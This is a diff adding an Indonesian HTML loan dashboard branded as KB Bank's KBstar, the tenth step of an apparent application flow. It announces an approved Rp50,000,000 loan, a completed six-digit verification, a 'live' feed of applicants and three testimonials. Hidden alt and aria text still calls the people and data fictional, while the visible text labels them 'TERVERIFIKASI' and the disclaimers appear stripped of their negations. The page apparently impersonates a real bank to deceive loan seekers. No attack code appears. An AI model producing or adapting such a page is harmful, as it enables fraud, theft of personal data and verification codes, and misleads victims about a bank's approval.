@@ -1,0 +1,539 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#16082f" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none';" />
+  <title>Tahap 10 — Dashboard Pinjaman</title>
+  <style>
+    :root{
+      --bg1:#200c43;--bg2:#14072d;--bg3:#090417;
+      --gold:#f6cd54;--gold2:#fff19a;--gold3:#d59419;
+      --text:#fff;--muted:#cfc6d9;--muted2:#a99fb5;
+      --ok:#caffc8;--danger:#ffc0ba;
+      --line:rgba(247,205,84,.34);--soft-line:rgba(255,255,255,.09);
+      --surface:linear-gradient(180deg,rgba(60,28,101,.70),rgba(17,7,39,.84));
+      --radius:26px;--dash:1080px;
+    }
+    *{box-sizing:border-box}
+    html,body{max-width:100%;overflow-x:hidden;scroll-behavior:smooth}
+    body{
+      margin:0;min-height:100svh;color:var(--text);
+      font-family:Inter,ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
+      background:radial-gradient(circle at 50% -10%,rgba(91,42,153,.34),transparent 35%),linear-gradient(180deg,#090310,#120625);
+    }
+    button,input{font:inherit;color:inherit}button{cursor:pointer}a{color:inherit;text-decoration:none}
+    .app{
+      width:min(100%,var(--dash));min-height:100svh;margin:auto;position:relative;overflow:hidden;isolation:isolate;
+      background:radial-gradient(circle at 98% 30%,rgba(255,185,36,.08),transparent 20%),radial-gradient(circle at 3% 2%,rgba(108,55,172,.18),transparent 23%),linear-gradient(180deg,var(--bg1),var(--bg2) 30%,var(--bg3));
+      box-shadow:0 26px 70px rgba(0,0,0,.4);
+    }
+    .app:before{
+      content:"";position:absolute;width:720px;height:720px;left:-440px;top:-360px;border-radius:50%;border:1px solid rgba(213,174,255,.08);
+      box-shadow:0 0 0 78px rgba(255,255,255,.014),0 0 0 156px rgba(255,255,255,.010),0 0 0 234px rgba(255,255,255,.007);z-index:-2
+    }
+    .app:after{
+      content:"";position:absolute;width:510px;height:510px;right:-360px;bottom:250px;border-radius:50%;border:84px solid rgba(219,157,38,.42);
+      box-shadow:inset 0 0 25px rgba(255,245,179,.28),0 0 0 1px rgba(255,235,132,.35),0 0 24px rgba(250,176,35,.10);z-index:-2
+    }
+    .badge{
+      position:fixed;z-index:80;top:max(10px,env(safe-area-inset-top));left:50%;transform:translateX(-50%);
+      max-width:calc(100vw - 22px);padding:7px 11px;border-radius:999px;background:#f8db6a;color:#2b1b00;
+      border:1px solid rgba(255,255,255,.35);font-size:10px;font-weight:900;letter-spacing:.055em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+      box-shadow:0 7px 18px rgba(0,0,0,.26)
+    }
+
+    
+
+    
+
+    .top{display:flex;justify-content:space-between;align-items:flex-end;padding:24px 28px 0;gap:18px}
+    .brand{line-height:1}.brand .name{font-size:30px;letter-spacing:-.055em}.brand .kb{background:linear-gradient(#ffc32d,#ee980b);-webkit-background-clip:text;background-clip:text;color:transparent}.brand .star{color:#f0eef5}.brand small{display:block;margin-top:7px;color:#bcb3ca;font-size:11px;letter-spacing:.04em}
+    .demo-mark{font-size:11px;color:#fff18d;text-align:right;line-height:1.45}.demo-mark strong{display:block;font-size:12px}
+    .content{padding:40px 28px 50px}.welcome{display:flex;justify-content:space-between;align-items:end;gap:18px;margin-bottom:22px}
+    .eyebrow{margin:0 0 8px;color:#fff18d;font-size:11px;font-weight:800;letter-spacing:.16em;text-transform:uppercase}
+    h1{margin:0;font-family:Georgia,"Times New Roman",serif;font-size:37px;font-weight:400;line-height:1.08;letter-spacing:-.03em}
+    .welcome-note{max-width:300px;color:#bfb6ca;font-size:12px;line-height:1.5;text-align:right}
+    .layout{display:grid;grid-template-columns:minmax(0,1.45fr) minmax(300px,.75fr);gap:18px;align-items:start}
+    .stack{display:grid;gap:18px;min-width:0}
+    .card{position:relative;min-width:0;padding:22px;border-radius:var(--radius);border:1px solid var(--line);background:var(--surface);box-shadow:inset 0 1px 0 rgba(255,255,255,.05),0 18px 45px rgba(0,0,0,.24);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
+    .card h2{margin:0;font-size:15px;letter-spacing:-.01em}.card-sub{margin:6px 0 0;color:#b9afc4;font-size:11.5px;line-height:1.5}
+    .hero-card{overflow:hidden;padding:24px;background:radial-gradient(circle at 90% 12%,rgba(255,216,92,.13),transparent 28%),linear-gradient(145deg,rgba(73,34,119,.87),rgba(18,7,41,.92));}
+    .hero-card:after{content:"";position:absolute;width:190px;height:190px;border:34px solid rgba(246,205,84,.16);border-radius:50%;right:-105px;bottom:-110px;pointer-events:none}
+    .hero-top{display:flex;justify-content:space-between;gap:14px;align-items:start}.tag{display:inline-flex;align-items:center;gap:7px;padding:6px 9px;border-radius:999px;border:1px solid rgba(255,231,129,.34);background:rgba(255,217,85,.08);color:#ffe879;font-size:10px;font-weight:800;letter-spacing:.07em}.tag-dot{width:6px;height:6px;border-radius:50%;background:#ffe879;box-shadow:0 0 10px rgba(255,232,121,.75)}
+    .amount-label{margin:25px 0 4px;color:#d8cfe1;font-size:12px}.amount{font-size:45px;font-weight:800;letter-spacing:-.045em;line-height:1.05;color:#fff;text-shadow:0 6px 22px rgba(0,0,0,.24)}
+    .hero-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin-top:22px}.metric{padding:13px;border-radius:16px;border:1px solid rgba(255,255,255,.09);background:rgba(7,3,18,.24);min-width:0}.metric span{display:block;color:#a99fb5;font-size:9.5px;text-transform:uppercase;letter-spacing:.06em}.metric strong{display:block;margin-top:5px;color:#f8f4fb;font-size:12px;line-height:1.3;overflow-wrap:anywhere}
+    .statusline{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:12px;padding-top:14px;border-top:1px solid rgba(255,255,255,.08);font-size:11px;color:#bdb4c8}.status-pill{padding:6px 9px;border-radius:999px;background:rgba(144,255,139,.09);border:1px solid rgba(165,255,161,.20);color:#caffc8;font-weight:800;white-space:nowrap}
+    .section-head{display:flex;justify-content:space-between;gap:12px;align-items:start;margin-bottom:16px}.tiny-demo{padding:5px 8px;border-radius:999px;border:1px solid rgba(255,255,255,.10);color:#cfc6d9;font-size:9px;white-space:nowrap}
+    .installment-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}.info-box{padding:15px;border-radius:17px;background:rgba(8,4,20,.36);border:1px solid rgba(255,255,255,.08)}.info-box span{display:block;color:#a99fb5;font-size:10px}.info-box strong{display:block;margin-top:6px;font-size:16px;letter-spacing:-.02em}.disclaimer{margin:14px 0 0;padding:11px 12px;border-radius:13px;border-left:2px solid #f6cd54;background:rgba(246,205,84,.055);color:#cbc2d4;font-size:10.5px;line-height:1.5}
+    .stepper{list-style:none;padding:0;margin:4px 0 0}.stepper li{position:relative;display:flex;gap:12px;align-items:flex-start;padding:0 0 17px;color:#d9d2e1;font-size:12px}.stepper li:last-child{padding-bottom:0}.stepper li:not(:last-child):before{content:"";position:absolute;left:8px;top:18px;bottom:0;width:1px;background:linear-gradient(rgba(202,255,200,.68),rgba(246,205,84,.2))}.check{position:relative;z-index:1;flex:0 0 17px;width:17px;height:17px;border-radius:50%;display:grid;place-items:center;background:#caffc8;color:#173315;font-size:10px;font-weight:900;box-shadow:0 0 0 4px rgba(202,255,200,.05)}.stepper strong{display:block;color:#fff;font-size:12px}.stepper small{display:block;margin-top:3px;color:#92889e;font-size:10px;line-height:1.4}
+    .account-form label{display:block;margin:15px 0 8px;font-size:12px;font-weight:800}.input-wrap{position:relative}.account-form input{width:100%;height:58px;border:1px solid rgba(255,255,255,.16);border-radius:17px;outline:none;padding:0 16px;background:rgba(8,4,20,.52);color:#fff;caret-color:#ffd95e;font-size:16px;letter-spacing:.04em}.account-form input::placeholder{color:#776e84}.account-form input:focus{border-color:#f3cc52;box-shadow:0 0 0 3px rgba(243,204,82,.11)}
+    .help{margin:8px 2px 0;color:#a99fb5;font-size:10.5px;line-height:1.45}.error,.success{min-height:18px;margin:9px 2px 0;font-size:10.5px;line-height:1.45}.error{color:var(--danger)}.success{color:var(--ok)}
+    .primary{width:100%;min-height:56px;margin-top:4px;border:2px solid #f6d34f;border-radius:17px;background:linear-gradient(180deg,rgba(67,30,111,.78),rgba(25,10,55,.88));color:#ffdf63;font-size:14px;font-weight:800;box-shadow:0 0 0 2px rgba(255,199,38,.10),0 8px 24px rgba(0,0,0,.22)}.primary:focus-visible,.quick:focus-visible,.account-form input:focus-visible{outline:2px solid #fff19a;outline-offset:2px}
+    .quick-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px}.quick{min-height:86px;border:1px solid rgba(255,255,255,.10);border-radius:17px;background:rgba(8,4,20,.34);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:9px;padding:10px;color:#eee8f3;font-size:10.5px;font-weight:700;text-align:center}.icon{width:34px;height:34px;border-radius:12px;border:1px solid rgba(246,205,84,.30);display:grid;place-items:center;color:#ffe16f;background:rgba(246,205,84,.06)}.icon svg{width:17px;height:17px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+
+    .live-feed-section{overflow:hidden;background:radial-gradient(circle at 92% 0%,rgba(125,255,164,.07),transparent 28%),var(--surface)}
+    .live-feed-head{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:14px}.live-feed-meta{min-width:0}.live-feed-badges{display:flex;flex-wrap:wrap;justify-content:flex-end;gap:6px}.live-clock,.fiction-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 8px;border-radius:999px;font-size:8.5px;font-weight:900;letter-spacing:.06em;white-space:nowrap}.live-clock{border:1px solid rgba(138,255,160,.22);background:rgba(108,255,135,.06);color:#caffc8}.live-clock:before{content:"";width:6px;height:6px;border-radius:50%;background:#7cff8c;box-shadow:0 0 0 0 rgba(124,255,140,.6);animation:livePulse 1.8s ease-out infinite}.fiction-badge{border:1px solid rgba(246,205,84,.24);background:rgba(246,205,84,.06);color:#ffe27d}.live-feed-list{display:grid;gap:8px}.live-feed-item{position:relative;display:grid;grid-template-columns:minmax(0,1.25fr) minmax(115px,.75fr);gap:10px;align-items:center;padding:12px 13px;border-radius:16px;border:1px solid rgba(255,255,255,.08);background:linear-gradient(145deg,rgba(33,14,66,.72),rgba(8,4,20,.48));box-shadow:inset 0 1px 0 rgba(255,255,255,.035);overflow:hidden}.live-feed-item.is-new{animation:feedEnter .42s ease both,feedHighlight 1.8s ease both}.live-feed-primary{display:flex;align-items:center;gap:10px;min-width:0}.live-initials{flex:0 0 34px;width:34px;height:34px;display:grid;place-items:center;border-radius:12px;border:1px solid rgba(246,205,84,.25);background:linear-gradient(145deg,rgba(246,205,84,.12),rgba(106,54,150,.12));color:#ffe27d;font-size:10px;font-weight:900}.live-person{min-width:0}.live-person strong{display:block;color:#fff;font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.live-person span{display:block;margin-top:3px;color:#a99fb5;font-size:9.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.live-feed-value{text-align:right;min-width:0}.live-amount{display:block;color:#fff4ba;font-size:11.5px;font-weight:900;white-space:nowrap}.live-status-row{display:flex;align-items:center;justify-content:flex-end;gap:7px;margin-top:4px}.live-status{display:inline-flex;padding:3px 6px;border-radius:999px;border:1px solid rgba(202,255,200,.16);background:rgba(202,255,200,.06);color:#caffc8;font-size:7.5px;font-weight:900;letter-spacing:.04em}.live-relative{color:#93899f;font-size:8.5px;white-space:nowrap}.live-empty{padding:14px;text-align:center;color:#9f95aa;font-size:10px}.live-feed-note{margin-top:11px;color:#9f95aa;font-size:9px;line-height:1.45}.live-feed-note b{color:#ffe27d}@keyframes livePulse{0%{box-shadow:0 0 0 0 rgba(124,255,140,.55)}70%{box-shadow:0 0 0 7px rgba(124,255,140,0)}100%{box-shadow:0 0 0 0 rgba(124,255,140,0)}}@keyframes feedEnter{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}@keyframes feedHighlight{0%,32%{border-color:rgba(246,205,84,.62);box-shadow:inset 0 0 0 1px rgba(246,205,84,.12),0 0 20px rgba(246,205,84,.06)}100%{border-color:rgba(255,255,255,.08);box-shadow:inset 0 1px 0 rgba(255,255,255,.035)}}
+    .testimonial-section{overflow:hidden;background:radial-gradient(circle at 88% 4%,rgba(246,205,84,.07),transparent 30%),var(--surface)}.testimonial-heading-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 9px;border-radius:999px;border:1px solid rgba(246,205,84,.28);background:rgba(246,205,84,.06);color:#ffe27d;font-size:8.5px;font-weight:900;letter-spacing:.08em;white-space:nowrap}.testimonial-heading-badge:before{content:"";width:5px;height:5px;border-radius:50%;background:#ffe27d;box-shadow:0 0 8px rgba(255,226,125,.6)}.testimonials{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding:3px 1px 10px;overscroll-behavior-inline:contain;scrollbar-width:thin}.testimonial{position:relative;flex:0 0 min(330px,88%);scroll-snap-align:start;padding:17px;border-radius:20px;border:1px solid rgba(246,205,84,.24);background:linear-gradient(145deg,rgba(67,31,105,.48),rgba(8,4,20,.46));box-shadow:inset 0 1px 0 rgba(255,255,255,.06),0 12px 30px rgba(0,0,0,.17);overflow:hidden}.testimonial:after{content:"";position:absolute;width:100px;height:100px;border-radius:50%;right:-48px;top:-48px;background:radial-gradient(circle,rgba(246,205,84,.12),transparent 68%);pointer-events:none}.testimonial-top{position:relative;z-index:1;display:flex;gap:12px;align-items:center;padding-right:26px}.avatar{width:54px;height:54px;flex:0 0 54px;border-radius:50%;object-fit:cover;border:2px solid #e8c754;box-shadow:0 0 0 3px rgba(246,205,84,.06),0 7px 18px rgba(0,0,0,.22)}.person-info{min-width:0}.person-info strong{display:block;color:#fff;font-size:12.5px;line-height:1.25;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.person-role{display:block;margin-top:3px;color:#f2ce5c;font-size:10px;font-weight:700}.person-location{display:block;margin-top:4px;color:#a89eb4;font-size:9.5px;line-height:1.35}.quote-mark{position:absolute;right:0;top:-5px;color:rgba(246,205,84,.72);font-family:Georgia,serif;font-size:38px;line-height:1}.quote{position:relative;z-index:1;margin:14px 0 0;padding-top:12px;border-top:1px solid rgba(246,205,84,.13);color:#ddd5e4;font-size:11px;line-height:1.62}.testimonial-footer{position:relative;z-index:1;margin-top:13px}.fiction{display:inline-flex;align-items:center;gap:6px;padding:5px 8px;border-radius:999px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.035);color:#d7cfdc;font-size:8px;font-weight:800;letter-spacing:.06em}.fiction:before{content:"✓";display:grid;place-items:center;width:14px;height:14px;border-radius:50%;border:1px solid rgba(246,205,84,.35);color:#ffe27d;font-size:8px}.testimonial-note{margin-top:12px;padding:11px 12px;border-radius:14px;border:1px solid rgba(255,234,133,.12);background:rgba(255,255,255,.025);color:#aaa0b4;font-size:9.5px;line-height:1.5}.testimonial-note b{color:#ffe27d}
+    .data-note{display:flex;gap:9px;align-items:start;margin-top:16px;padding:12px 13px;border-radius:15px;border:1px solid rgba(255,234,133,.15);background:rgba(255,255,255,.035);color:#cfc7d7;font-size:10.5px;line-height:1.5}.data-note b{color:#ffe377}
+    footer{padding:0 28px 34px;text-align:center;color:#8e8499;font-size:10.5px;line-height:1.5}
+    @media(max-width:760px){
+      .app{width:min(100%,520px)}.content{padding:36px 22px 42px}.top{padding-left:22px;padding-right:22px}.welcome{display:block}.welcome-note{text-align:left;margin-top:10px;max-width:none}.layout{grid-template-columns:1fr}.amount{font-size:40px}.quick-grid{grid-template-columns:repeat(2,minmax(0,1fr))}.quick{min-height:82px}.live-feed-item{grid-template-columns:minmax(0,1fr) auto}.live-feed-head{align-items:flex-start}.live-feed-badges{max-width:155px}
+    }
+    @media(max-width:420px){.top{padding-left:20px;padding-right:20px}.content{padding-left:18px;padding-right:18px}.hero-card,.card{padding:18px}h1{font-size:31px}.hero-grid{grid-template-columns:1fr 1fr}.hero-grid .metric:last-child{grid-column:1/-1}.amount{font-size:36px}.installment-grid{grid-template-columns:1fr 1fr}.badge{font-size:9px}.demo-mark{font-size:9.5px}}
+    @media(min-width:1120px){body{padding:24px 0}.app{border-radius:34px;min-height:auto}}
+    @media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}.live-clock:before,.live-feed-item.is-new{animation:none}}
+
+    /* Mobile safety patch: badge simulasi tetap terbaca penuh pada layar kecil. */
+    @media (max-width:360px){
+      .badge{
+        max-width:calc(100vw - 20px);
+        white-space:normal;
+        overflow:visible;
+        text-overflow:clip;
+        text-align:center;
+        line-height:1.18;
+        font-size:8.5px;
+        letter-spacing:.035em;
+        padding:6px 9px;
+      }
+
+      .top{padding-top:12px}
+    }
+
+  
+
+    /* Informasi KBstar + corporate footer — scoped, tidak memengaruhi flow utama. */
+    .kb-public-info{
+      --kbi-bg:#0c051a;--kbi-card:rgba(60,28,101,.48);--kbi-card-2:rgba(17,7,39,.72);
+      --kbi-gold:#f6cd54;--kbi-gold-soft:#fff19a;--kbi-text:#fff;--kbi-muted:#cfc6d9;
+      --kbi-border:rgba(246,205,84,.22);
+      margin:0;padding:26px 28px 30px;color:var(--kbi-text);border-top:1px solid var(--kbi-border);
+      background:linear-gradient(180deg,rgba(13,5,29,.18),rgba(9,4,23,.72));
+    }
+    .kb-public-info *{box-sizing:border-box}
+    .kb-public-alert{
+      margin:0 0 20px;padding:12px 14px;border:1px solid rgba(246,205,84,.28);border-radius:15px;
+      background:rgba(246,205,84,.07);color:#e8e0ec;font-size:11px;line-height:1.6;
+    }
+    .kb-public-alert strong{color:var(--kbi-gold-soft)}
+    .kb-public-info a{color:inherit;text-decoration:none}
+    .kb-kbstar-panel{
+      display:grid;grid-template-columns:minmax(210px,.85fr) minmax(0,1.4fr);gap:22px;align-items:center;
+      padding:18px;border:1px solid var(--kbi-border);border-radius:22px;background:var(--kbi-card-2);overflow:hidden;
+    }
+    .kb-kbstar-art{
+      min-height:210px;position:relative;overflow:hidden;border-radius:18px;padding:22px;
+      background:linear-gradient(135deg,#6518ba 0%,#8428da 60%,#e39a23 145%);
+    }
+    .kb-kbstar-art:before,.kb-kbstar-art:after{content:"";position:absolute;border-radius:50%;pointer-events:none}
+    .kb-kbstar-art:before{width:220px;height:220px;left:-110px;bottom:-135px;background:rgba(73,16,126,.42)}
+    .kb-kbstar-art:after{width:185px;height:185px;right:-90px;top:-95px;background:rgba(255,184,37,.72)}
+    .kb-kbstar-word{position:relative;z-index:2;font-size:22px;letter-spacing:-.04em}.kb-kbstar-word .kb-k{color:#ffc62d}.kb-kbstar-word .kb-s{color:#fff}
+    .kb-kbstar-tagline{position:relative;z-index:2;margin-top:25px;max-width:180px;font-size:24px;font-weight:800;line-height:1.14;letter-spacing:-.025em}
+    .kb-phone{position:absolute;z-index:3;width:65px;height:130px;border:4px solid #251c2c;border-radius:17px;background:#16111b;padding:5px;box-shadow:0 16px 28px rgba(0,0,0,.34)}
+    .kb-phone:before{content:"";display:block;height:100%;border-radius:10px;background:linear-gradient(180deg,#7b25d1,#3d126c)}
+    .kb-phone.p1{right:78px;top:62px;transform:rotate(-15deg)}.kb-phone.p2{right:24px;top:28px;transform:rotate(18deg)}
+    .kb-public-eyebrow{margin:0 0 8px;color:var(--kbi-gold);font-size:11px;font-weight:850;letter-spacing:.12em;text-transform:uppercase}
+    .kb-public-title{margin:0;font-size:25px;line-height:1.25;letter-spacing:-.025em;color:#fff}
+    .kb-public-copy{margin:10px 0 0;color:var(--kbi-muted);font-size:13px;line-height:1.7;max-width:660px}
+    .kb-public-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:17px}
+    .kb-public-action{display:inline-flex;align-items:center;justify-content:center;min-height:42px;padding:10px 14px;border-radius:13px;border:1px solid rgba(246,205,84,.25);background:rgba(246,205,84,.07);color:var(--kbi-gold-soft)!important;font-size:11.5px;font-weight:800;transition:background .18s ease,border-color .18s ease}
+    .kb-public-action:hover{background:rgba(246,205,84,.12);border-color:rgba(246,205,84,.44)}
+    .kb-corp-grid{display:grid;grid-template-columns:1fr 1.15fr 1fr;gap:18px;margin-top:18px}
+    .kb-corp-col{padding:17px;border:1px solid rgba(255,255,255,.08);border-radius:18px;background:var(--kbi-card)}
+    .kb-corp-col h3{margin:0 0 12px;color:var(--kbi-gold);font-size:13px;letter-spacing:.01em}
+    .kb-corp-col p{margin:0 0 7px;color:var(--kbi-muted);font-size:11px;line-height:1.55}
+    .kb-corp-col strong{color:#fff;font-weight:800}
+    .kb-corp-links{display:grid;gap:8px}
+    .kb-corp-links a{color:var(--kbi-muted)!important;font-size:11px;line-height:1.4}
+    .kb-corp-links a:hover{color:var(--kbi-gold-soft)!important}
+    .kb-corp-legal{margin-top:18px;padding-top:16px;border-top:1px solid rgba(246,205,84,.14);color:#aaa0b5;font-size:10px;line-height:1.65}
+    .kb-corp-legal strong{color:#ddd5e4}
+    .kb-corp-bottom{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-top:10px;color:#8f859a;font-size:9.5px}
+    @media(max-width:760px){
+      .kb-public-info{padding:22px 20px 27px}.kb-kbstar-panel{grid-template-columns:1fr;padding:14px}.kb-kbstar-art{min-height:220px}.kb-corp-grid{grid-template-columns:1fr}.kb-public-title{font-size:22px}
+    }
+    @media(max-width:380px){
+      .kb-public-info{padding-left:16px;padding-right:16px}.kb-kbstar-art{min-height:205px;padding:18px}.kb-kbstar-tagline{font-size:21px;max-width:155px}.kb-phone{width:58px;height:116px}.kb-phone.p1{right:65px;top:70px}.kb-phone.p2{right:18px;top:36px}.kb-public-actions{display:grid}.kb-public-action{width:100%}
+    }
+    @media(prefers-reduced-motion:reduce){.kb-public-action{transition:none}}
+</style>
+  <script src="/page-transition.js?v=1"></script>
+</head>
+<body>
+  <div class="badge">KB BANK FINANCE — PINJAMAN ANDA DISETUJUI !   </div>
+  <main class="app">
+<header class="top">
+      <div class="brand"><div class="name"><span class="kb">KB</span><span class="star">star</span></div><small>by KB Bank</small></div>
+      <div class="demo-mark"><strong>Dashboard Pinjaman</strong></div>
+    </header>
+
+    <section class="content">
+      <div class="welcome">
+        <div><p class="eyebrow">TAHAP 10 · DASHBOARD</p><h1>Selamat datang, <span id="demoName">Pengguna</span></h1></div>
+        <div class="welcome-note">Ringkasan berikut merupakan antarmuka dan keputusan kredit, rekening, pencairan, atau transaksi bank KB BANK FINANCE .</div>
+      </div>
+
+      <div class="layout">
+        <div class="stack">
+          <section class="card hero-card" id="ringkasan" aria-labelledby="loanTitle">
+            <div class="hero-top"><div><h2 id="loanTitle">Ringkasan Pengajuan</h2><p class="card-sub">Ringkasan data yang tersedia.</p></div><span class="tag"><span class="tag-dot"></span></span></div>
+            <div class="amount-label">Nominal Pinjaman</div>
+            <div class="amount" id="loanAmount">Rp50.000.000</div>
+            <div class="hero-grid">
+              <div class="metric"><span>Jenis Pinjaman</span><strong id="loanType">Kredit Serba Guna</strong></div>
+              <div class="metric"><span>Tenor</span><strong id="loanTenor">36 Bulan</strong></div>
+              <div class="metric"><span>Cicilan</span><strong id="loanInstallment">Rp1.388.889 / bulan</strong></div>
+            </div>
+            <div class="statusline"><span>Status proses antarmuka</span><span class="status-pill">STATUS PINJAMAN AKTIF</span></div>
+            <div class="data-note"><span aria-hidden="true">◇</span><span><b>Data TERVERIFIKASI.</b> Tahap sebelumnya menyimpan data lintas halaman, dashboard memakai data TERVERIFIKASI.</span></div>
+          </section>
+
+          <section class="card" id="cicilan" aria-labelledby="installmentTitle">
+            <div class="section-head"><div><h2 id="installmentTitle">Informasi Cicilan </h2><p class="card-sub">Estimasi sederhana untuk presentasi antarmuka.</p></div><span class="tiny-demo"></span></div>
+            <div class="installment-grid">
+              <div class="info-box"><span>Cicilan per Bulan</span><strong id="monthlyValue">Rp1.388.889</strong></div>
+              <div class="info-box"><span>Tenor</span><strong id="tenorValue">36 Bulan</strong></div>
+              <div class="info-box"><span>Total Periode</span><strong id="periodValue">3 Tahun</strong></div>
+              <div class="info-box"><span>Jatuh Tempo Pertama</span><strong>Data TERVERIFIKASI</strong></div>
+              <div class="info-box"><span>Bunga Estimasi</span><strong id="interestRateValue">12% / tahun</strong></div>
+              <div class="info-box"><span>Total Bunga Estimasi</span><strong id="totalInterestValue">Rp18.000.000</strong></div>
+            </div>
+            <p class="disclaimer"><strong> penawaran kredit resmi.</strong> Nilai  mencakup bunga, provisi, asuransi, pajak, atau biaya lain dan menunjukkan persetujuan kredit.</p>
+          </section>
+
+          <section class="card" id="menu" aria-labelledby="quickTitle">
+            <div class="section-head"><div><h2 id="quickTitle">Menu Cepat</h2><p class="card-sub">Navigasi ke KB BANK FINANCE.</p></div></div>
+            <div class="quick-grid">
+              <a class="quick" href="#ringkasan"><span class="icon"><svg viewBox="0 0 24 24"><path d="M4 13h6V4H4zM14 20h6v-9h-6zM4 20h6v-3H4zM14 7h6V4h-6z"/></svg></span>Ringkasan</a>
+              <a class="quick" href="#cicilan"><span class="icon"><svg viewBox="0 0 24 24"><path d="M5 4h14v16H5zM8 8h8M8 12h3M8 16h8"/></svg></span>Cicilan </a>
+              <a class="quick" href="#rekening"><span class="icon"><svg viewBox="0 0 24 24"><path d="M3 10h18M5 10V6l7-3 7 3v4M6 10v8M10 10v8M14 10v8M18 10v8M3 20h18"/></svg></span>Rekening</a>
+              <a class="quick" id="finalResultLink" href="#status"><span class="icon"><svg viewBox="0 0 24 24"><path d="M5 12l4 4L19 6"/></svg></span>Ringkasan Saya</a>
+            </div>
+          </section>
+
+          <section class="card live-feed-section" id="aktivitas" aria-labelledby="liveFeedTitle">
+            <div class="live-feed-head">
+              <div class="live-feed-meta"><h2 id="liveFeedTitle">Aktivitas Pengajuan</h2><p class="card-sub">Pembaruan otomatis · Data TERVERIFIKASI</p></div>
+              <div class="live-feed-badges"><span class="live-clock" id="liveClock">LIVE • --:--:-- WIB</span><span class="fiction-badge">DATA TERVERIFIKASI</span></div>
+            </div>
+            <div class="live-feed-list" id="liveFeedList" aria-live="polite" aria-label="Aktivitas pengajuan dengan data fiktif"></div>
+            <p class="live-feed-note"><b>Catatan:</b> Seluruh nama, kota, nominal, status, dan waktu pada daftar ini dibuat secara lokal untuk kebutuhan  KB BANK FINANCE  data nasabah 
+              </p>
+          </section>
+
+          <section class="card testimonial-section" aria-labelledby="testimonialTitle">
+            <div class="section-head">
+              <div><h2 id="testimonialTitle">Cerita Pengguna</h2><p class="card-sub"> pengalaman penggunaan antarmuka. Seluruh nama, foto, lokasi, dan kutipan di bawah merupakan data TERVERIFIKASI</p></div>
+              <span class="testimonial-heading-badge">H </span>
+            </div>
+            <div class="testimonials" aria-label="Contoh testimoni dengan data fiktif">
+              <article class="testimonial">
+                <div class="testimonial-top">
+                  <img class="avatar" src="assets/testimonials/andi-pratama.jpg" alt="Foto ilustrasi fiktif Andi Pratama">
+                  <div class="person-info"><strong>Andi Pratama</strong><span class="person-role">Wiraswasta</span><span class="person-location">Bandung, Jawa Barat</span></div>
+                  <span class="quote-mark" aria-hidden="true">“</span>
+                </div>
+                <p class="quote">“Proses pengajuan terasa lebih mudah dipahami karena setiap tahap ditampilkan dengan jelas dan rapi.”</p>
+                <div class="testimonial-footer"><span class="fiction"></span></div>
+              </article>
+              <article class="testimonial">
+                <div class="testimonial-top">
+                  <img class="avatar" src="assets/testimonials/siti-rahmawati.jpg" alt="Foto ilustrasi fiktif Siti Rahmawati">
+                  <div class="person-info"><strong>Siti Rahmawati</strong><span class="person-role">Pemilik Usaha</span><span class="person-location">Surabaya, Jawa Timur</span></div>
+                  <span class="quote-mark" aria-hidden="true">“</span>
+                </div>
+                <p class="quote">“Informasi yang tersedia cukup membantu saya memahami alur pengajuan dan memeriksa kembali data sebelum melanjutkan.”</p>
+                <div class="testimonial-footer"><span class="fiction"> DATA TERVERIFIKASI</span></div>
+              </article>
+              <article class="testimonial">
+                <div class="testimonial-top">
+                  <img class="avatar" src="assets/testimonials/budi-santoso.jpg" alt="Foto ilustrasi fiktif Budi Santoso">
+                  <div class="person-info"><strong>Budi Santoso</strong><span class="person-role">Karyawan Swasta</span><span class="person-location">Jakarta, DKI Jakarta</span></div>
+                  <span class="quote-mark" aria-hidden="true">“</span>
+                </div>
+                <p class="quote">“Tampilan di ponsel nyaman digunakan, alur pengisian data tersusun rapi, dan ringkasan membantu pengecekan ulang.”</p>
+                <div class="testimonial-footer"><span class="fiction"></span></div>
+              </article>
+            </div>
+            <div class="testimonial-note"><b>Catatan:</b> Testimoni di atas merupakan untuk kebutuhan antarmuka dan  bukti persetujuan kredit, pencairan dana, atau transaksi perbankan nyata KB BANK FINANCE</div>
+          </section>
+        </div>
+
+        <aside class="stack">
+          <section class="card" id="status" aria-labelledby="statusTitle">
+            <div class="section-head"><div><h2 id="statusTitle">Status Proses</h2><p class="card-sub">Progress KB BANK FINANCE hasil credit scoring.</p></div><span class="tiny-demo">5 / 5</span></div>
+            <ol class="stepper">
+              <li><span class="check">✓</span><div><strong>Data </strong><small>Form telah dilalui.</small></div></li>
+              <li><span class="check">✓</span><div><strong>Verifikasi</strong><small>Interaksi 6 digit selesai.</small></div></li>
+              <li><span class="check">✓</span><div><strong>Profil Pengajuan</strong><small>Profil pekerjaan/usaha contoh.</small></div></li>
+              <li><span class="check">✓</span><div><strong>Detail Pinjaman</strong><small>Nominal, tenor, CICILAN.</small></div></li>
+              <li><span class="check">✓</span><div><strong>Proses Selesai</strong><small> kredit disetujui.</small></div></li>
+            </ol>
